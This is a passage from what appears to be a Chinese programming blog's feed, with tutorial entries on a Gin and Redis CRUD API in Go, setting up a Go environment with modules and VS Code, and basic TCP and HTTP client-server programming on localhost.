class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;删除成功1&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UserUpdate</span><span class="params">(c *gin.Context, ctx *context.Context)</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> user models.User</span><br><span class="line">	<span class="keyword">if</span> c.Bind(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">		err := user.UpdateUser(ctx)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"></span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;修改失败&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">-1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line"></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">				<span class="string">&quot;msg&quot;</span>:  <span class="string">&quot;修改成功&quot;</span>,</span><br><span class="line">				<span class="string">&quot;code&quot;</span>: <span class="number">1</span>,</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">400</span>, gin.H&#123;<span class="string">&quot;JSON=== status&quot;</span>: <span class="string">&quot;binding JSON error!&quot;</span>&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>main.go 代码</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;example.com/goRedis/api&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/goRedis/db&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ctx := context.Background()</span><br><span class="line">	db.InitRedis(ctx)</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.POST(<span class="string">&quot;/userAdd&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		api.UserAdd(c, &amp;ctx)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.GET(<span class="string">&quot;/userAll&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		api.UserAll(c, &amp;ctx)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.GET(<span class="string">&quot;/userGet/:key&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		key := c.Param(<span class="string">&quot;key&quot;</span>)</span><br><span class="line"></span><br><span class="line">		api.UserGet(c, &amp;ctx, key)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/userUpdate&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		api.UserUpdate(c, &amp;ctx)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.POST(<span class="string">&quot;/userDel&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		api.UserDel(c, &amp;ctx)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ul>
<li>使用python调用服务端代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test11&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1123456&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="number">1</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;t_key1&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/userAdd&quot;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1:8000/userGet/t_key2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">resp = requests.get(<span class="string">&quot;http://127.0.0.1:8000/userAll&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data =&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;test1131&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456811&quot;</span>, <span class="string">&quot;id&quot;</span>: <span class="number">111</span>, <span class="string">&quot;key&quot;</span>: <span class="string">&quot;t_key21&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/userUpdate&quot;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">data =&#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;t_key1&quot;</span>&#125;</span><br><span class="line">resp = requests.post(<span class="string">&quot;http://127.0.0.1:8000/userDel&quot;</span>, json=data)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><p><a href="https://blog.51cto.com/u_15326986/5729402">Go使用Gin+Redis实现增删改查</a></p>
</li>
<li><p><a href="https://blog.csdn.net/ximenjianxue/article/details/100163938">Nosql之Redis详解</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>go环境搭建</title>
    <url>/aposts/5c600320/</url>
    <content><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>打开<a href="https://go.dev/dl/">官网</a>，下载win平台下的msi安装文件，环境变量设置<code>E:\app\Go\bin</code></p>
</li>
<li><p>本地新建目录，<code>E:\proj\gowork</code>作为工作空间</p>
</li>
<li><p>初始化项目</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">cd E:\proj\gowork</span><br><span class="line">mkdir hello_work</span><br><span class="line">cd hello_work</span><br><span class="line"><span class="keyword">go</span> mod init example.com/hello_work</span><br><span class="line"></span><br><span class="line">$ <span class="keyword">go</span> mod init example.com/hello_work</span><br><span class="line"><span class="keyword">go</span>: creating <span class="built_in">new</span> <span class="keyword">go</span>.mod: module example.com/hello_work</span><br><span class="line"><span class="keyword">go</span>: to add module requirements and sums:</span><br><span class="line">        <span class="keyword">go</span> mod tidy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>go mod tidy 执行后，把当前项目中不需要用的依赖文件删除，也就是go.mod中添加的依赖文件</p>
</blockquote>
<ul>
<li>当前最新的工作目录如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Administrator@WIN-5TF67LA12I4 MINGW64 /e/proj/gowork</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">go.mod  hello_work/</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>下载并打开<a href="https://code.visualstudio.com/Download">Visual Studio Code</a>，作为开发go的工具，扩展中安装GO</li>
<li>按快捷键<code>ctrl+shift+x</code>，打开扩展，安装GO和chinese</li>
</ul>
<p><img src="/aposts/5c600320/image-20230525113031586.png" alt="image-20230525113031586"></p>
<ul>
<li>安装go tools的依赖插件</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> env -w GO111MODULE=on</span><br><span class="line"><span class="keyword">go</span> env -w GOPROXY=https:<span class="comment">//proxy.golang.com.cn,direct</span></span><br></pre></td></tr></table></figure>

<ul>
<li>按<code>Ctrl+Shift+P</code> 然后搜索<code>&gt;Go:Install/Update Tools</code> 然后勾选全部项目即可。</li>
</ul>
<p><img src="/aposts/5c600320/image-20230525114744401.png" alt="image-20230525114744401"></p>
<h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><ul>
<li>vscode 打开<code>E:\proj\gowork</code>目录</li>
<li>在终端中拉取远程的依赖项目代码：<code>go get github.com/georgehao/gomodtestc</code></li>
<li>拉取远程代码成功后，<code>go.mod</code>文件中生产的代码如下</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">module example.com/hello_work</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="number">1.20</span></span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">		github.com/georgehao/gomodtestc v1<span class="number">.0</span><span class="number">.1</span> <span class="comment">// indirect</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p><img src="/aposts/5c600320/image-20230531170143420.png" alt="image-20230531170143420"></p>
<ul>
<li><code>hello_wrok/main.go</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">	&quot;example.com/hello_work/hello_work/util&quot; // 引用本地其他目录下的文件</span><br><span class="line">	&quot;github.com/georgehao/gomodtestc&quot; // 引用远程项目地址</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	fmt.Println(gomodtestc.PrintStr(&quot;Hello&quot;, 100)) // 调用远程项目的代码</span><br><span class="line">	Print_hello() // 相同文件夹内的函数直接调用，来自于代码hello.go</span><br><span class="line">	util.Print_work() //util是包名</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在编写代码中，比如输入Print_hello，import自动导入依赖包</p>
</blockquote>
<ul>
<li><code>hello_work/hello.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Print_hello</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Print_hello!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><code>hello_work/util/work.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;imp-init() come here.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Print_work</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>执行命令，如下go run 执行了两个go文件，因为不这样执行无法调用到hello.go中的函数，理论上根目录下只有一个main.go函数，其他函数写到其他目录下</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork&gt; <span class="keyword">go</span> run .\hello_work\main.<span class="keyword">go</span> .\hello_work\hello.<span class="keyword">go</span></span><br><span class="line">imp-init() come here.</span><br><span class="line">project C Hello_100</span><br><span class="line">Print_hello!       </span><br><span class="line">Hello!</span><br></pre></td></tr></table></figure>

<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p><img src="/aposts/5c600320/98a11ab7c2d04b9a9aa01c447b5aace4.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p><code>go1.18</code>以后的版本，不在使用<code>GOPATH </code>进行项目依赖管理，因此在搭建环境过程中就不在需要新建<code>src,bin,pkg</code>目录</p>
</li>
<li><p><a href="https://blog.csdn.net/xyc1211/article/details/121204654">go mod依赖管理</a></p>
</li>
<li><p><a href="https://cloud.tencent.com/developer/article/1970405">Go 1.18 workspace 使用初体验</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go网络编程</title>
    <url>/aposts/9cb489d1/</url>
    <content><![CDATA[<h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><ul>
<li><p>Socket又称“套接字”，应用程序通常通过“套接字”向网络发出请求或者应答网络请求</p>
</li>
<li><p>常用的Socket类型有两种：流式Socket和数据报式Socket，流式是一种面向连接的Socket，针对于面向连接的TCP服务应用，数据报式Socket是一种无连接的Socket，针对于无连接的UDP服务应用</p>
</li>
<li><p>TCP：比较靠谱，面向连接，比较慢</p>
</li>
<li><p>UDP：不是太靠谱，比较快</p>
</li>
<li><p>举个例子：TCP就像货到付款的快递，送到家还必须见到你人才算一整套流程。UDP就像某快递快递柜一扔就走管你收到收不到，一般直播用UDP。</p>
</li>
</ul>
<h3 id="TCP编程"><a href="#TCP编程" class="headerlink" title="TCP编程"></a>TCP编程</h3><h4 id="server"><a href="#server" class="headerlink" title="server"></a>server</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work\tcp\server.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">process</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">var</span> buff [<span class="number">128</span>]<span class="type">byte</span></span><br><span class="line">		<span class="comment">// 将tcp连接读取到的数据读取到byte数组中, 返回读取到的byte的数目</span></span><br><span class="line">		n, err := conn.Read(buff[:])</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="comment">// 从客户端读取数据的过程中发生错误</span></span><br><span class="line">			fmt.Println(<span class="string">&quot;read from client failed, err:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		recvStr := <span class="type">string</span>(buff[:n])</span><br><span class="line">		fmt.Println(<span class="string">&quot;收到client端发来的数据&quot;</span>, recvStr)</span><br><span class="line">		<span class="comment">// conn.Write([]byte(recvStr)) // 发送数据</span></span><br><span class="line">		conn.Write([]<span class="type">byte</span>(<span class="string">&quot;这是服务端返回的数据&quot;</span>)) <span class="comment">// 发送数据</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 监听当前的tcp连接</span></span><br><span class="line">	listen, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:2000&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;liston failed, error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		conn, err := listen.Accept() <span class="comment">//建立tcp连接</span></span><br><span class="line">		fmt.Print(<span class="string">&quot;建立tcp连接&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;aceept failed,error&quot;</span>, err)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 启动一个新的线程</span></span><br><span class="line">		<span class="keyword">go</span> process(conn)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 连接tcp服务器</span></span><br><span class="line">	conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;127.0.0.1:2000&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;err:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;连接tcp服务成功&quot;</span>)</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	<span class="comment">// 获取一个标准输入的*Reader结构体指针类型的变</span></span><br><span class="line">	inputReader := bufio.NewReader(os.Stdin)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="comment">// 读取用户输入</span></span><br><span class="line">		input, _ := inputReader.ReadString(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		<span class="comment">// 去掉\r\n</span></span><br><span class="line">		inputInfo := strings.Trim(input, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">		<span class="comment">// 用户输入q,就退出</span></span><br><span class="line">		<span class="keyword">if</span> strings.ToUpper(inputInfo) == <span class="string">&quot;Q&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 发送数据到tcp服务端</span></span><br><span class="line">		_, err := conn.Write([]<span class="type">byte</span>(inputInfo))</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;send data is worng,error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		buff := [<span class="number">512</span>]<span class="type">byte</span>&#123;&#125;</span><br><span class="line">		<span class="comment">// var buff [512]byte</span></span><br><span class="line">		<span class="comment">// 读取服务端发送的数据</span></span><br><span class="line">		n, err := conn.Read(buff[:])</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;recv failed, err:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;客户端接受服务端的数据为：&quot;</span>, <span class="type">string</span>(buff[:n]))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><ul>
<li><p>分别运行<code>go run hello_work/tcp/server.go</code>和<code>go run hello_work/tcp/client.go</code></p>
</li>
<li><p>客户端输入数据后，服务端返回数据</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\hello_work\tcp&gt; go run .\server.go</span><br><span class="line">建立tcp连接收到client端发来的数据 22</span><br><span class="line">收到client端发来的数据 333</span><br><span class="line"></span><br><span class="line">PS E:\proj\gowork&gt; go run .\hello_work\tcp\client.go</span><br><span class="line">连接tcp服务成功</span><br><span class="line">22</span><br><span class="line">客户端接受服务端的数据为： 这是服务端返回的数据</span><br><span class="line">333</span><br><span class="line">客户端接受服务端的数据为： 这</span><br></pre></td></tr></table></figure>

<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><ul>
<li>HTTP协议通常承载于TCP协议之上</li>
<li>下面的实例包含两部分，一部分是最简单的http服务器和客户端，另外一部分是展示如何使用json传递消息</li>
</ul>
<h3 id="server-1"><a href="#server-1" class="headerlink" title="server"></a>server</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/http/server.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myhandler</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	fmt.Println(r.RemoteAddr, <span class="string">&quot;连接成功&quot;</span>)</span><br><span class="line">	fmt.Println(<span class="string">&quot;method:&quot;</span>, r.Method)</span><br><span class="line">	fmt.Println(<span class="string">&quot;url:&quot;</span>, r.URL)</span><br><span class="line">	fmt.Println(<span class="string">&quot;header:&quot;</span>, r.Header)</span><br><span class="line">	fmt.Println(<span class="string">&quot;body:&quot;</span>, r.Body)</span><br><span class="line">	<span class="comment">// 服务器回复内容</span></span><br><span class="line">	w.Write([]<span class="type">byte</span>(<span class="string">&quot;hello word!&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 监控客户端发送的请求网址后缀为/go,并调用自定义回调函数</span></span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/go&quot;</span>, myhandler)</span><br><span class="line">	<span class="comment">// http.HandleFunc(&quot;/to&quot;, myhandler1)</span></span><br><span class="line">	http.ListenAndServe(<span class="string">&quot;127.0.0.1:8000&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>启动server</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go run hello_work/http/server.go</span><br></pre></td></tr></table></figure>

<h3 id="client-1"><a href="#client-1" class="headerlink" title="client"></a>client</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/http/client</span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:8000/go&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;连接服务器失败,error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	fmt.Println(<span class="string">&quot;code:&quot;</span>, resp.StatusCode)</span><br><span class="line">	buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="comment">// 接受服务器信息</span></span><br><span class="line">		n, err := resp.Body.Read(buf)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;读取服务器数据失败,error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;读取服务器数据成功&quot;</span>)</span><br><span class="line">		res := <span class="type">string</span>(buf[:n])</span><br><span class="line">		fmt.Println(res)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行客户端</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">PS E:\proj\gowork\hello_work&gt; <span class="keyword">go</span> run .\http\client.<span class="keyword">go</span></span><br><span class="line">code: <span class="number">200</span></span><br><span class="line">读取服务器数据成功</span><br><span class="line">hello word!</span><br><span class="line">PS E:\proj\gowork\hello_work&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>实际上的场景肯定复杂的多，比如常见的客户端和服务端都是用json交互，如下面代码</li>
</ul>
<h3 id="server1"><a href="#server1" class="headerlink" title="server1"></a>server1</h3><ul>
<li>服务器代码进行优化，当请问为post时，接受客户端的json参数，响应结果也是以json字符串进行返回</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/http/server.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Data <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name <span class="type">string</span></span><br><span class="line">	Age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义返回给客户端的结构体</span></span><br><span class="line"><span class="keyword">type</span> Ret <span class="keyword">struct</span> &#123;</span><br><span class="line">	Code  <span class="type">int</span></span><br><span class="line">	Param <span class="type">string</span></span><br><span class="line">	Msg   <span class="type">string</span></span><br><span class="line">	Data  []Data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myHandlerJson</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> r.Method == <span class="string">&quot;POST&quot;</span> &#123;</span><br><span class="line">		err := r.ParseForm()</span><br><span class="line">		<span class="comment">// 接受客户端传过来的json</span></span><br><span class="line">		formData := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;读取客户端的数据失败,error:&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 调用json包的解析，解析请求body</span></span><br><span class="line">		json.NewDecoder(r.Body).Decode(&amp;formData)</span><br><span class="line">		<span class="comment">// 打印客户端传过来的json值</span></span><br><span class="line">		<span class="keyword">for</span> key, value := <span class="keyword">range</span> formData &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;key:&quot;</span>, key, <span class="string">&quot; =&gt; value :&quot;</span>, value)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		data := Data&#123;Name: <span class="string">&quot;li&quot;</span>, Age: <span class="number">18</span>&#125;</span><br><span class="line">		ret := <span class="built_in">new</span>(Ret)</span><br><span class="line">		ret.Code = <span class="number">0</span></span><br><span class="line">		ret.Msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">		ret.Param = <span class="string">&quot;1&quot;</span></span><br><span class="line">		ret.Data = <span class="built_in">append</span>(ret.Data, data)</span><br><span class="line">		ret.Data = <span class="built_in">append</span>(ret.Data, data)</span><br><span class="line">		ret.Data = <span class="built_in">append</span>(ret.Data, data)</span><br><span class="line">		<span class="comment">// 将结构体转换为切片</span></span><br><span class="line">		ret_json, _ := json.Marshal(ret)</span><br><span class="line">		<span class="comment">// 传递参数给客户端</span></span><br><span class="line">		io.WriteString(w, <span class="type">string</span>(ret_json))</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span 